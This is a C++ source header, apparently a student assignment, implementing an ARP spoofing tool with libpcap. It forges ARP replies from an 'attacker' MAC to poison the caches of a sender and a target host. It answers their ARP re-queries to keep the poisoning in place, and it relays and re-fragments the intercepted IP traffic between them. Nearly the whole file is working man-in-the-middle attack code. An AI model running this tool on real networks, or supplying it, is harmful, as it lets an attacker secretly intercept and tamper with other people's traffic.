#pragma once
#include "pch.h"
#include "checksum.h"

struct ArpInfo
{
    const char *dev;
    pcap_t *pcap;
    u_int8_t *attacker_mac;
    u_int8_t *sender_mac;
    u_int8_t *target_mac;
    u_int8_t *sender_ip;
    u_int8_t *target_ip;
};

uint16_t calc_checksum_ip(IpHdr *ip_);
int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_mac, u_int8_t *sender_mac, u_int8_t *sender_ip, u_int8_t *target_mac, u_int8_t *target_ip, int type)
{
    EthArpPacket packet;

    memcpy(packet.eth_.dmac_, dest_mac, 6);
    memcpy(packet.eth_.smac_, source_mac, 6);
    // copy_mac(dest_mac, packet.eth_.dmac_);
    // copy_mac(source_mac, packet.eth_.smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = 6;
    packet.arp_.pln_ = 4;

    // packet.arp_.op_ = type;
    if (type == 0)
    {
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if (type == 1)
    {
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    else
    {
        printf("case 0 is sending request, case 1 is sending reply\n");
        return -1;
    }

    memcpy(packet.arp_.smac_, sender_mac, 6);
    memcpy(packet.arp_.sip, sender_ip, 4);
    // copy_mac(sender_mac, packet.arp_.smac_);
    // copy_ip(sender_ip, packet.arp_.sip);

    memcpy(packet.arp_.tmac_, target_mac, 6);
    memcpy(packet.arp_.tip, target_ip, 4);
    // copy_mac(target_mac, packet.arp_.tmac_);
    // copy_ip(target_ip, packet.arp_.tip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return -1;
    }
    return 0;
}

int reply(const char *dev, pcap_t *pcap, u_int8_t *mac, u_int8_t *ip)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    while (1)
    {
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res != 1)
        {
            printf("error!\n");
            return -1;
        }
        EthArpPacket *arppkt;
        arppkt = (EthArpPacket *)packet;

        // if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && if_same_ip(arppkt->arp_.sip, ip))
        if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && (!memcmp(arppkt->arp_.sip, ip, 4)))
        {
            // copy_mac(arppkt->arp_.smac_, mac);
            memcpy(mac, arppkt->arp_.smac_, 6);
            break;
        }
    }
    return 0;
}

int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, int count)
{
    const int fragment_size = 1440;
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        EthArpPacket *pkt;
        TcpIpPacket *ip_pkt;
        pkt = (EthArpPacket *)packet;
        ip_pkt = (TcpIpPacket *)packet;
        int size_of_data;
        int offset = 0;

        u_int sendsize;
        u_char data[1500];
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        for (int i = 0; i < count; i++)
        {
            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, targets[i].target_mac, 6)) && (!memcmp(pkt->arp_.tip, targets[i].sender_ip, 4)))
            {
                printf("where is sender?\n");
                request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, 1);
                continue;
            }

            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, targets[i].sender_mac, 6)) && (!memcmp(pkt->arp_.tip, targets[i].target_ip, 4)))
            {
                printf("where is target?\n");
                request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, 1);
                continue;
            }

            if (if_same_mac(pkt->eth_.smac_, targets[i].sender_mac))
            {
                if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
                {
                    // memcpy(pkt->eth_.dmac_, target_mac, 6);
                    // memcpy(pkt->eth_.smac_, attacker_mac, 6);
                    copy_mac(targets[i].target_mac, pkt->eth_.dmac_);
                    copy_mac(attacker_mac, pkt->eth_.smac_);

                    int i = 0;
                    int flag = 0;
                    sendsize = header->len;
                    while (sendsize > fragment_size + 34)
                    {
                        flag = 1;
                        for (int j = 0; j < fragment_size; j++)
                        {
                            *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
                        }
                        print_mac(attacker_mac);
                        ip_pkt->ip_.ip_len = htons(fragment_size + 20);
                        ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0010000000000000);
                        ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
                        int res = pcap_sendpacket(pcap, (u_char *)pkt, fragment_size + 34);
                        if (res != 0)
                        {
                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                            return -1;
                        }
                        sendsize -= fragment_size;
                        i++;
                    }

                    if (flag == 1)
                    {

                        for (int j = 0; j < sendsize - 34; j++)
                        {
                            *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
                        }

                        sendsize = header->len - fragment_size * i;
                        ip_pkt->ip_.ip_len = htons(sendsize - 14);
                        ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0000000000000000);
                        ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
                        printf("sendsize : %d\n", sendsize);
                        int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
                        if (res != 0)
                        {
                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                            return -1;
                        }
                        continue;
                    }

                    int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                    if (res != 0)
                    {
                        printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                        return -1;
                    }
                }
            }
            else if (if_same_mac(pkt->eth_.smac_, targets[i].target_mac))
            {
                if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
                {
                    copy_mac(targets[i].sender_mac, pkt->eth_.dmac_);
                    copy_mac(attacker_mac, pkt->eth_.smac_);

                    int i = 0;
                    int flag = 0;
                    sendsize = header->len;
                    // memcpy(data, packet + 34, sendsize - 34);
                    //단위 400 434 int i = 0;
                    while (sendsize > fragment_size + 34)
                    {
                        flag = 1;
                        printf("before");
                        print_mac(attacker_mac);
                        for (int j = 0; j < fragment_size; j++)
                        {
                            *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
                        }
                        print_mac(attacker_mac);
                        ip_pkt->ip_.ip_len = htons(fragment_size + 20);
                        ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0010000000000000);
                        ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
                        int res = pcap_sendpacket(pcap, (u_char *)pkt, fragment_size + 34);
                        if (res != 0)
                        {
                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                            return -1;
                        }
                        sendsize -= fragment_size;
                        i++;
                    }

                    if (flag == 1)
                    {

                        for (int j = 0; j < sendsize - 34; j++)
                        {
                            *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
                        }

                        sendsize = header->len - fragment_size * i;
                        ip_pkt->ip_.ip_len = htons(sendsize - 14);
                        ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0000000000000000);
                        ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
                        printf("sendsize : %d\n", sendsize);
                        int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
                        if (res != 0)
                        {
                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                            return -1;
                        }
                        continue;
                    }

                    int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                    if (res != 0)
                    {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                        return -1;
                    }
                    // ip_pkt->ip_.ip_len = htons(sendsize - 14);
                    // ip_pkt->ip_.ip_offset = 0;
                    //  memcpy(pkt->eth_.dmac_, sender_mac, 6);
                    //  memcpy(pkt->eth_.smac_, attacker_mac, 6);
                }
            }
        }
    }
    return 0;
}
